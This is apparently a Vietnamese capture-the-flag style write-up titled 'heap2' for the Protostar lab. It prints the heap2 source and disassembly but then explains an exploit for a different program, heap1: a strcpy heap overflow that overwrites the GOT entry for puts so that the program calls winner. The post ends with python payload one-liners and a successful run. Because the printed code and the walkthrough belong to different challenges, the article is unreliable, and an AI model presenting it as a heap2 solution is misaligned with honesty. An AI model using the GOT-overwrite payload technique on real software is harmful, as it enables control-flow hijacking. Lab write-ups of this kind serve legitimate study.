---
layout: post
title: heap2
---

Trong bài này, chúng ta sẽ exploit heap để điều hướng chương trình.
Sau đây là source code và asm code của chương trình heap2.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```
```asm
0x08048934 <main+0>:    push   ebp
0x08048935 <main+1>:    mov    ebp,esp
0x08048937 <main+3>:    and    esp,0xfffffff0
0x0804893a <main+6>:    sub    esp,0x90
0x08048940 <main+12>:   jmp    0x8048943 <main+15>
0x08048942 <main+14>:   nop
0x08048943 <main+15>:   mov    ecx,DWORD PTR ds:0x804b5f8
0x08048949 <main+21>:   mov    edx,DWORD PTR ds:0x804b5f4
0x0804894f <main+27>:   mov    eax,0x804ad70
0x08048954 <main+32>:   mov    DWORD PTR [esp+0x8],ecx
0x08048958 <main+36>:   mov    DWORD PTR [esp+0x4],edx
0x0804895c <main+40>:   mov    DWORD PTR [esp],eax
0x0804895f <main+43>:   call   0x804881c <printf@plt>
0x08048964 <main+48>:   mov    eax,ds:0x804b164
0x08048969 <main+53>:   mov    DWORD PTR [esp+0x8],eax
0x0804896d <main+57>:   mov    DWORD PTR [esp+0x4],0x80
0x08048975 <main+65>:   lea    eax,[esp+0x10]
0x08048979 <main+69>:   mov    DWORD PTR [esp],eax
0x0804897c <main+72>:   call   0x80487ac <fgets@plt>
0x08048981 <main+77>:   test   eax,eax
0x08048983 <main+79>:   jne    0x8048987 <main+83>
0x08048985 <main+81>:   leave
0x08048986 <main+82>:   ret
0x08048987 <main+83>:   mov    DWORD PTR [esp+0x8],0x5
0x0804898f <main+91>:   mov    DWORD PTR [esp+0x4],0x804ad8d
0x08048997 <main+99>:   lea    eax,[esp+0x10]
0x0804899b <main+103>:  mov    DWORD PTR [esp],eax
0x0804899e <main+106>:  call   0x804884c <strncmp@plt>
0x080489a3 <main+111>:  test   eax,eax
0x080489a5 <main+113>:  jne    0x8048a01 <main+205>
0x080489a7 <main+115>:  mov    DWORD PTR [esp],0x4
0x080489ae <main+122>:  call   0x804916a <malloc>
0x080489b3 <main+127>:  mov    ds:0x804b5f4,eax
0x080489b8 <main+132>:  mov    eax,ds:0x804b5f4
0x080489bd <main+137>:  mov    DWORD PTR [esp+0x8],0x4
0x080489c5 <main+145>:  mov    DWORD PTR [esp+0x4],0x0
0x080489cd <main+153>:  mov    DWORD PTR [esp],eax
0x080489d0 <main+156>:  call   0x80487bc <memset@plt>
0x080489d5 <main+161>:  lea    eax,[esp+0x10]
0x080489d9 <main+165>:  add    eax,0x5
0x080489dc <main+168>:  mov    DWORD PTR [esp],eax
0x080489df <main+171>:  call   0x80487fc <strlen@plt>
0x080489e4 <main+176>:  cmp    eax,0x1e
0x080489e7 <main+179>:  ja     0x8048a01 <main+205>
0x080489e9 <main+181>:  lea    eax,[esp+0x10]
0x080489ed <main+185>:  lea    edx,[eax+0x5]
0x080489f0 <main+188>:  mov    eax,ds:0x804b5f4
0x080489f5 <main+193>:  mov    DWORD PTR [esp+0x4],edx
0x080489f9 <main+197>:  mov    DWORD PTR [esp],eax
0x080489fc <main+200>:  call   0x804880c <strcpy@plt>
0x08048a01 <main+205>:  mov    DWORD PTR [esp+0x8],0x5
0x08048a09 <main+213>:  mov    DWORD PTR [esp+0x4],0x804ad93
0x08048a11 <main+221>:  lea    eax,[esp+0x10]
0x08048a15 <main+225>:  mov    DWORD PTR [esp],eax
0x08048a18 <main+228>:  call   0x804884c <strncmp@plt>
0x08048a1d <main+233>:  test   eax,eax
0x08048a1f <main+235>:  jne    0x8048a2e <main+250>
0x08048a21 <main+237>:  mov    eax,ds:0x804b5f4
0x08048a26 <main+242>:  mov    DWORD PTR [esp],eax
0x08048a29 <main+245>:  call   0x804999c <free>
0x08048a2e <main+250>:  mov    DWORD PTR [esp+0x8],0x6
0x08048a36 <main+258>:  mov    DWORD PTR [esp+0x4],0x804ad99
0x08048a3e <main+266>:  lea    eax,[esp+0x10]
0x08048a42 <main+270>:  mov    DWORD PTR [esp],eax
0x08048a45 <main+273>:  call   0x804884c <strncmp@plt>
0x08048a4a <main+278>:  test   eax,eax
0x08048a4c <main+280>:  jne    0x8048a62 <main+302>
0x08048a4e <main+282>:  lea    eax,[esp+0x10]
0x08048a52 <main+286>:  add    eax,0x7
0x08048a55 <main+289>:  mov    DWORD PTR [esp],eax
0x08048a58 <main+292>:  call   0x804886c <strdup@plt>
0x08048a5d <main+297>:  mov    ds:0x804b5f8,eax
0x08048a62 <main+302>:  mov    DWORD PTR [esp+0x8],0x5
0x08048a6a <main+310>:  mov    DWORD PTR [esp+0x4],0x804ada1
0x08048a72 <main+318>:  lea    eax,[esp+0x10]
0x08048a76 <main+322>:  mov    DWORD PTR [esp],eax
0x08048a79 <main+325>:  call   0x804884c <strncmp@plt>
0x08048a7e <main+330>:  test   eax,eax
0x08048a80 <main+332>:  jne    0x8048942 <main+14>
0x08048a86 <main+338>:  mov    eax,ds:0x804b5f4
0x08048a8b <main+343>:  mov    eax,DWORD PTR [eax+0x20]
0x08048a8e <main+346>:  test   eax,eax
0x08048a90 <main+348>:  je     0x8048aa3 <main+367>
0x08048a92 <main+350>:  mov    DWORD PTR [esp],0x804ada7
0x08048a99 <main+357>:  call   0x804883c <puts@plt>
0x08048a9e <main+362>:  jmp    0x8048943 <main+15>
0x08048aa3 <main+367>:  mov    DWORD PTR [esp],0x804adc3
0x08048aaa <main+374>:  call   0x804883c <puts@plt>
0x08048aaf <main+379>:  jmp    0x8048943 <main+15>
```

Mục tiêu là gọi được hàm `winner`. `strcpy` có thể lợi dụng được để exploit chương trình.
Sử dụng objdump hoặc gdb, ta tìm được địa chỉ của `winner` là `0x08048494`.
Trong chương trình có sử dụng 2 lần `strcpy` và theo sau là `printf` (`puts` trong asm).
Bản chất của lệnh `call puts@plt` là điều hướng chương trình về một bảng symbol do `puts` là external symbol (khác với `winner` hay `main` được định nghĩa trực tiếp trong source code).
Ở các bài về `printf`, ta điều hướng chương trình bằng cách ghi lại giá dẫn đến hàm `puts` thực bằng một giá trị dẫn đến hàm mục tiêu.
Dựa theo phỏng đoán, ta sẽ dùng `strcpy` lần đầu để ghi lại địa chỉ mà giá trị ở đó chứa địa chỉ của `puts` vào `i2->name`.
Sau đó `strcpy` thứ hai sẽ đọc địa chỉ này, và ghi địa chỉ của `winner` vào đó.

Trước hết, chúng ta sẽ kiếm tra vị trí tương đối của 2 biến `i1` và `i2` trên bộ nhớ.
Sau khi chạy thử chương trình với tham số bất kỳ, đây là bộ nhớ tại `esp`.
Từ asm code, ta biết được địa chỉ của <span style="color:aqua">i1</span> và <span style="color:springgreen">i2</span> nằm lần lượt tại `esp + 0x14` và `esp + 0x18`.

<pre class="memory">
0xbffff770:     0x00000008      0xb7fd7ff4      0x08048580      0xbffff798
0xbffff780:     0xb7ec6365      <span style="color:aqua">0x0804a008</span>      <span style="color:springgreen">0x0804a028</span>      0xb7fd7ff4
0xbffff790:     0x08048580      0x00000000      0xbffff818      0xb7eadc76
</pre>

Với cấu trúc của struct `internet`, 4 byte đầu sẽ là `priority` và 4 byte sau là địa chỉ của `name`.
Như vậy, offset của `name` với địa chỉ của biến sẽ là 0x04.
Ta sẽ suy ra được, trong trường hợp này, vị trí của `i1->name` và `i2->name` là `0x0804a00c` và `0x0804a02c`.
Bộ nhớ tại thời điêm trước sau khi `malloc` biến sẽ như sau.

<pre class="memory">
0x804a008:      0x00000001      <span style="color:aqua">0x0804a018</span>      0x00000000      0x00000011
<span style="color:aqua">0x804a018</span>:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      <span style="color:springgreen">0x0804a038</span>      0x00000000      0x00000011
<span style="color:springgreen">0x804a038</span>:      0x00000000      0x00000000      0x00000000      0x00020fc1
</pre>

Hai địa chỉ tương ứng này là `0x0804a018` và `0x0804a038`.
Với kiểu layout này, lần chạy `strcpy` đầu tiên ta có thể lưu tràn từ địa chỉ của `i1->name` tại `0x0804a018` qua vị trí lưu `name` trên biến `i2` là `0x0804a02c`.
Như vậy, tham số đầu tiên của chương trình sẽ cần 24 byte, trong đó 20 byte đầu để làm phần đệm và 4 byte cuối chứa địa chỉ của `puts` trên bảng lookup symbol `got.plt`.
Sau đây là vị trí trên bộ nhớ. Phân biệt theo màu với <span style="color:yellow">địa chỉ lệnh gọi đến symbol puts@plt</span>, <span style="color:orangered">địa chỉ chứa symbol puts@plt trên bảng got.plt</span>, và <span style="color:fuchsia">địa chỉ thực của puts@plt, cần thay thế bằng địa chi của winner</span>.
<pre class="memory">
0x8048561 <main+168>    call   <span style="color:yellow">0x80483cc <puts@plt></span>
...
<span style="color:yellow">0x80483cc <puts@plt></span>:   jmp    DWORD PTR ds:<span style="color:orangered">0x8049774</span>
...
<span style="color:orangered">0x8049774</span> <_GLOBAL_OFFSET_TABLE_+36>:   <span style="color:fuchsia">0x080483d2</span>
</pre>

4 byte cuối cùng sẽ là `0x8049774`.
Như vậy ta sẽ dựng tham số đầu tiên như sau.

```bash
python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08"'
```

Tham số thứ hai sẽ là địa chỉ của `winner`.

```bash
python -c 'print "\x94\x84\x04\x08"'
```

Như vậy, chúng ta sẽ chạy chương trình với input như sau.
Lưu ý cần khoảng trống giữa hai tham số.

```bash
python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"'
```

<pre class="memory">
<span style="color:aqua">and we have a winner @ 1687025943</span>
</pre>

Mục tiêu đã hoàn thành!

## Ref
```bash
user@protostar:~$ heap1 $(python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"')
and we have a winner @ 1687025943
```
